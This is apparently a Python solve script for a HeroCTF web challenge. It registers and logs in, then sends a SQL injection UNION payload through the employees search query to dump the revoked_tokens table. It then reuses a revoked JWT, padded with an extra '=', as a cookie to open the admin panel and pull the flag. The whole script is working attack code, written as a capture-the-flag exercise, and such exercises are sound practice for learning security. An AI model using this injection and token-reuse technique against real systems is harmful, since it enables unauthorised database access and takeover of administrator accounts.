import requests
import re

url = "http://dyn08.heroctf.fr:14512"

s = requests.Session()

# register and login
creds = {
    'username': "user",
    'password': "pass"
}

s.post(f'{url}/register', data=creds)
s.post(f'{url}/login', data=creds)

# get revoked tokens
payload = "aihdoaihdosa%' UNION SELECT id,token,1,1 FROM revoked_tokens--"

res = s.get(f'{url}/employees?query={payload}')

tokens = re.findall(r'alt="(.+)"', res.text)

# admin panel
payload = tokens[1] + "="   # only the 2nd token has admin privileges

res = s.get(f'{url}/admin', headers={ 'Cookie': f'JWT={payload}' })

flag = re.findall(r'(Hero{.+})', res.text)[0]
print(flag)